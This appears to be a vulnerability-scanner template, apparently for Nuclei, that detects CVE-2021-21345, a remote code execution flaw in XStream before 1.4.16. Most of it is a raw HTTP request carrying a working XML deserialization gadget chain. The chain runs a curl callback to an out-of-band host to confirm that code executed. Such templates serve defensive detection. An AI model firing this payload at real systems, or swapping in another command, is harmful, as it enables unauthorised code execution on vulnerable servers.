id: CVE-2021-21345
info:
  name: XStream > 1.4.16  - Remote Code Execution
  author: pwnhxl
  severity: critical
  description: XStream prior to version 1.4.16 contains a vulnerability, CVE-2021-21345,
    allowing an attacker with necessary privileges to execute commands on the targeted
    system by manipulating the input stream.
  reference:
  - https://x-stream.github.io/CVE-2021-21345.html
  - http://x-stream.github.io/changes.html#1.4.16
  - https://github.com/x-stream/xstream/security/advisories/GHSA-hwpc-8xqv-jvj4
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.9
    cve-id: CVE-2021-21345
    cwe-id: CWE-78
  tags: cve,cve2021,xstream,deserialization,rce,oast
  metadata:
    impact: The impact of CVE-2021-21345 on XStream versions prior to 1.4.16 is remote
      code execution, enabling attackers with sufficient privileges to execute commands
      on the host through manipulation of the input stream.
    recommendation: It is recommended to update XStream to version >= 1.4.16 to mitigate
      the risk of remote code execution via CVE-2021-21345.
requests:
- raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\n<java.util.PriorityQueue\
    \ serialization='custom'>\n  <unserializable-parents/>\n  <java.util.PriorityQueue>\n\
    \    <default>\n      <size>2</size>\n      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>\n\
    \        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>\n \
    \         <packet>\n            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>\n\
    \              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>\n\
    \                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>\n\
    \                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>\n\
    \                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>\n\
    \                      <jaxbType>com.sun.corba.se.impl.activation.ServerTableEntry</jaxbType>\n\
    \                      <uriProperties/>\n                      <attributeProperties/>\n\
    \                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>\n\
    \                        <getter>\n                          <class>com.sun.corba.se.impl.activation.ServerTableEntry</class>\n\
    \                          <name>verify</name>\n                          <parameter-types/>\n\
    \                        </getter>\n                      </inheritedAttWildcard>\n\
    \                    </bi>\n                    <tagName/>\n                 \
    \   <context>\n                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>\n\
    \                        <outer-class reference='../..'/>\n                  \
    \    </marshallerPool>\n                      <nameList>\n                   \
    \     <nsUriCannotBeDefaulted>\n                          <boolean>true</boolean>\n\
    \                        </nsUriCannotBeDefaulted>\n                        <namespaceURIs>\n\
    \                          <string>1</string>\n                        </namespaceURIs>\n\
    \                        <localNames>\n                          <string>UTF-8</string>\n\
    \                        </localNames>\n                      </nameList>\n  \
    \                  </context>\n                  </bridge>\n                </bridge>\n\
    \                <jaxbObject class='com.sun.corba.se.impl.activation.ServerTableEntry'>\n\
    \                  <activationCmd>curl http://{{interactsh-url}} -H 'User-Agent:\
    \ {{rand_base(6)}}'</activationCmd>\n                </jaxbObject>\n         \
    \     </dataSource>\n            </message>\n            <satellites/>\n     \
    \       <invocationProperties/>\n          </packet>\n        </indexMap>\n  \
    \    </comparator>\n    </default>\n    <int>3</int>\n    <string>javax.xml.ws.binding.attachments.inbound</string>\n\
    \    <string>javax.xml.ws.binding.attachments.inbound</string>\n  </java.util.PriorityQueue>\n\
    </java.util.PriorityQueue>\n"
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  - type: word
    part: interactsh_request
    words:
    - 'User-Agent: {{rand_base(6)}}'
